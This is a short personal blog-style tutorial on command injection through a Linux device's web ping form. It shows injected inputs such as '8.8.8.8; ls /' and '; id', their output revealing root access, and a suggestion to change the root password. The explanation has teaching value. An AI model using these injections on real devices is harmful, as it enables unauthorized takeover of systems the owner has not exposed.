---
title: Hacking into things
tags:
  - linux
  - hacking
  - programming
created: 2023-07-13T19:29:40+02:00
updated: 2023-08-27T22:01:32+02:00
enableToc: true
---

This has been something that I've had an interest for for many years and have dabbled in every now and then when I had the chance.

Every now and then you get a device that you soon figure out is running a flavour of Linux and you start wondering, can I get root access to it? 🤔
You start poking around and after a little while you find a HTML form that is not behaving as it should.

## HTML Forms
### Ping prompts
Ping prompts might be the easiest to see why it could be so easy to break.

In the form you might see something along the lines of an `Address` field and a `Submit` button.  
You enter in the address and press the button, a few seconds later you get back a response along the lines of:
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=54 time=27.1 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=54 time=27.7 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=54 time=26.1 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=54 time=26.8 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 26.142/26.944/27.731/0.569 ms
```

If you're familiar with Linux you quickly realize that this is the output of `iputils-ping`.  
What you should also realize is that this command is being called from the application running the webserver.  
With this information we can make some assumptions.

The command to get the exact output (except for the latency times and packet loss if any) is the following:
```
$ ping -c 4 8.8.8.8
```
From this we can extrapolate that the `Address` field from the form is populating the address used by the ping command.

Lets assume the command is run as: `ping -c 4 ${address}`  
This shows that the address is a variable and is populate based on what was entered in the `Address` field.

Now, what would happen if we instead input `8.8.8.8; ls /` in the `Address` field?  
The variable would then be expanded to `ping -c 4 8.8.8.8; ls /` and give us the following result:
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=54 time=26.0 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=54 time=27.3 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=54 time=27.9 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=54 time=28.9 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 25.995/27.524/28.853/1.037 ms
bin   dev  home  lib64       media  opt   root  sbin  sys  usr
boot  etc  lib   lost+found  mnt    proc  run   srv   tmp  var
```
Notice the directory listing at the bottom.

Now for the final check, instead of listing the directory, we check which user is being used to run the webserver and as an extension the commands.  
This we can achieve with the `id` command and would look like this: `; id`.  
The command will be expanded to `ping -c 4 8.8.8.8; id` and would give us the following result:
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=54 time=27.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=54 time=27.9 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=54 time=27.9 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=54 time=26.0 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 25.976/27.351/27.862/0.796 ms
uid=0(root) gid=0(root) groups=0(root)
```

This shows us that the root user is running the commands and we're already in.  
The only thing to do is to change the password of the root user.  

What we've done in this example is what's called Remote Code Execution (RCE) or Code Injection.